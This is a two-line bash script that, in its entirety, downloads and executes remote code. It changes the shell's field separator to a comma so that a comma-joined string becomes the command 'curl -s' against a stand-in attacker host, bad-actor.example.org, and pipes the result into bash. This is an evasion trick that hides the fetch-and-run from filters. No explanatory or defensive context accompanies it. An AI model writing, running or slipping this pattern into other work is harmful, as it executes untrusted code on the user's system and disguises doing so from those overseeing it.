#!/bin/bash
IFS=,;$(echo curl,-s,http://bad-actor.example.org/p)|bash
